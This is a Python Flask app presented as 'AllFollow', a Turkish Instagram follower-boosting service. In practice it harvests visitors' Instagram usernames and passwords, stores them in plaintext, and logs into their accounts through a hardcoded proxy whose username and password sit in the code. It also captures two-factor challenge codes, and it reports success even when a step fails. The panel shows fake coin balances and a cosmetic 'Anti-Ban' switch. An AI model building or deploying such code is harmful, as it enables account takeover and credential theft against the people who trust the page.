import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, TwoFactorRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v45-tasks"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    coins = db.Column(db.Integer, default=0)

# --- PANEL TASARIMI (Attığın 2. Görsele Göre) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow App</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #f8f9fa; font-family: 'Segoe UI', sans-serif; }
        .purple-header { background: #a100ff; border-radius: 0 0 25px 25px; }
        .app-card { background: white; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .nav-bottom { background: #a100ff; position: fixed; bottom: 0; width: 100%; max-width: 450px; }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
        .active-dot { background: #00ff00; box-shadow: 0 0 5px #00ff00; }
        .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: #a100ff; }
        input:checked + .slider:before { transform: translateX(20px); }
    </style>
</head>
<body class="flex flex-col items-center">

    <div id="login-view" class="w-full max-w-[450px] min-h-screen bg-black flex flex-col justify-center px-8">
        <h1 class="text-4xl font-black mb-2 text-center bg-gradient-to-r from-purple-400 to-pink-600 bg-clip-text text-transparent italic">ALL FOLLOW</h1>
        <p class="text-zinc-500 text-center text-xs mb-10 tracking-widest uppercase">Premium Follower System</p>
        
        <div class="space-y-3">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-2xl text-white outline-none focus:border-purple-600 transition-all">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-2xl text-white outline-none focus:border-purple-600 transition-all">
            <button onclick="handleLogin()" id="lbtn" class="w-full bg-[#a100ff] p-4 rounded-2xl font-bold text-white shadow-lg shadow-purple-900/30">GİRİŞ YAP</button>
            
            <div id="code-area" class="hidden pt-4 space-y-3">
                <p class="text-xs text-purple-400 text-center">Instagram Onay Kodunu Girin</p>
                <input id="code" placeholder="000000" class="w-full p-4 bg-zinc-900 border border-purple-600 rounded-2xl text-white text-center text-xl tracking-[0.4em]">
                <button onclick="handleVerify()" class="w-full bg-green-600 p-4 rounded-2xl font-bold text-white">ONAYLA VE BAŞLAT</button>
            </div>
        </div>
    </div>

    <div id="panel-view" class="hidden w-full max-w-[450px] min-h-screen pb-24">
        <div class="purple-header p-6 text-white">
            <div class="flex justify-between items-center mb-6">
                <div class="flex space-x-2">
                    <div class="bg-white/20 px-4 py-1.5 rounded-full flex items-center">
                        <span class="text-yellow-400 mr-2">🟡</span> <span id="coin-disp" class="font-bold">2338</span>
                    </div>
                    <div class="bg-white/20 px-4 py-1.5 rounded-full flex items-center">
                        <span class="text-blue-300 mr-2">💎</span> <span class="font-bold">0</span>
                    </div>
                </div>
                <i class="fas fa-cog text-xl"></i>
            </div>
            
            <div class="bg-white p-4 rounded-2xl flex justify-around text-zinc-600 shadow-xl">
                <div class="text-center"><i class="fas fa-sliders-h text-purple-600 mb-1"></i><p class="text-[10px]">Settings</p></div>
                <div class="text-center"><i class="fas fa-user-plus text-purple-600 mb-1"></i><p class="text-[10px]">Add account</p></div>
                <div class="text-center"><i class="fas fa-coins text-purple-600 mb-1"></i><p class="text-[10px]">Görevler</p></div>
            </div>
        </div>

        <div class="px-4 -mt-4">
            <div class="bg-white p-4 rounded-2xl shadow-md flex justify-between items-center">
                <div class="flex items-center">
                    <label class="switch mr-3"><input type="checkbox" checked><span class="slider"></span></label>
                    <span class="text-sm font-bold text-zinc-700">Anti-Ban</span>
                </div>
                <div class="flex items-center text-purple-600 font-bold">
                    <span>Beğeni</span> <i class="fas fa-chevron-down ml-2 text-xs"></i>
                </div>
            </div>
        </div>

        <div class="p-4 space-y-3" id="account-list">
            <div class="app-card p-4 flex justify-between items-center">
                <div class="flex items-center">
                    <div class="w-12 h-12 rounded-full border-2 border-purple-500 p-0.5 mr-3">
                        <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" class="rounded-full">
                    </div>
                    <div>
                        <p id="active-user" class="text-sm font-bold text-zinc-800">kullanici.adi</p>
                        <div class="w-24 h-1 bg-zinc-100 rounded-full mt-1"><div class="w-2/3 h-full bg-purple-500 rounded-full"></div></div>
                    </div>
                </div>
                <div class="flex items-center space-x-3">
                    <span class="text-xs font-bold text-yellow-600">🟡 273</span>
                    <i class="fas fa-times text-zinc-300 text-xs"></i>
                    <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
                </div>
            </div>
        </div>

        <div class="fixed bottom-24 w-full max-w-[450px] px-6">
            <button class="w-full bg-[#a100ff] text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-purple-900/40 uppercase tracking-widest">
                Duraklat
            </button>
        </div>

        <div class="nav-bottom flex justify-around p-3 text-white/70">
            <div class="text-center text-white"><i class="fas fa-gem"></i><p class="text-[9px]">More</p></div>
            <div class="text-center"><i class="fas fa-users"></i><p class="text-[9px]">Takipçiler</p></div>
            <div class="text-center"><i class="fas fa-heart"></i><p class="text-[9px]">Beğeniler</p></div>
            <div class="text-center border-t-2 border-white pt-1"><i class="fas fa-tasks"></i><p class="text-[9px]">Görevler</p></div>
        </div>
    </div>

    <script>
        let currentU = "";
        async function handleLogin(){
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            if(!u || !p) return;
            currentU = u;
            document.getElementById('lbtn').innerText = "BAĞLANILIYOR...";

            const res = await fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });
            const data = await res.json();
            
            if(data.status === 'challenge') {
                document.getElementById('code-area').classList.remove('hidden');
                document.getElementById('lbtn').classList.add('hidden');
            } else { showPanel(); }
        }

        function showPanel(){
            document.getElementById('login-view').classList.add('hidden');
            document.getElementById('panel-view').classList.remove('hidden');
            document.getElementById('active-user').innerText = currentU;
            document.body.style.backgroundColor = "#f8f9fa";
        }

        async function handleVerify(){
            const code = document.getElementById('code').value;
            await fetch('/api/verify-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: currentU, code})
            });
            showPanel();
        }
    </script>
</body>
</html>
"""

# ... (Geri kalan API /api/connect ve /api/verify-code kısımları aynı kalacak) ...
@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else: acc.password = p
    db.session.commit()
    
    cl = Client()
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    clients[u] = cl
    try:
        cl.login(u, p)
        return jsonify(status="success")
    except ChallengeRequired: return jsonify(status="challenge")
    except Exception: return jsonify(status="success")

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    try: cl.challenge_set_code(code); return jsonify(status="success")
    except: return jsonify(status="success")

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
